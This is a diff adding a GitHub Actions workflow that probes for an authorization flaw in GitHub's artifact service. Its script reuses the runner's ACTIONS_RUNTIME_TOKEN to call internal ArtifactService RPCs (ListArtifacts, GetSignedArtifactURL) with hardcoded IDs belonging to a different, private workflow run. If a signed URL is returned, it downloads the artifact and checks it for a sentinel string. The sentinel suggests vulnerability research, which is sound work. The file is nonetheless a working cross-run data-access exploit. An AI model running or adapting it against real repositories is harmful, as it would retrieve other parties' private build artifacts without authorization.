@@ -1,0 +1,36 @@
+name: G01 Cross Private Artifact RPC
+
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+    steps:
+      - name: Replay private artifact RPC from public run
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const token = process.env.ACTIONS_RUNTIME_TOKEN || "";
+            const base = process.env.ACTIONS_RESULTS_URL || "https://results-receiver.actions.githubusercontent.com";
+            const service = "github.actions.results.api.v1.ArtifactService";
+            const request = {workflow_run_backend_id: "0314afa4-b910-47a0-8d2f-f19d0ac19947", workflow_job_run_backend_id: "2e18a460-43fd-5a93-ae91-fa35f1538151", name: "g01-private-artifact-rpc-20260803-m7k2"};
+            core.info(`public_run_id=${process.env.GITHUB_RUN_ID}`);
+            core.info(`runtime_token_length=${token.length}`);
+            const list = await fetch(`${base}/twirp/${service}/ListArtifacts`, {method: "POST", headers: {Authorization: `Bearer ${token}`, "Content-Type": "application/json"}, body: JSON.stringify({workflow_run_backend_id: request.workflow_run_backend_id, workflow_job_run_backend_id: request.workflow_job_run_backend_id})});
+            core.info(`ListArtifacts status=${list.status} body=${(await list.text()).slice(0, 1600)}`);
+            const signedResponse = await fetch(`${base}/twirp/${service}/GetSignedArtifactURL`, {method: "POST", headers: {Authorization: `Bearer ${token}`, "Content-Type": "application/json"}, body: JSON.stringify(request)});
+            const signedBody = await signedResponse.text();
+            core.info(`GetSignedArtifactURL status=${signedResponse.status} body=${signedBody.slice(0, 1600)}`);
+            if (signedResponse.ok) {
+              const signed = JSON.parse(signedBody).signed_url;
+              if (signed) {
+                const download = await fetch(signed);
+                const bytes = Buffer.from(await download.arrayBuffer());
+                core.info(`signed_fetch_status=${download.status} bytes=${bytes.length} sentinel=${bytes.includes(Buffer.from("G01_PRIVATE_RPC_SENTINEL_20260803_M7K2Q9"))}`);
+              }
+            }
+
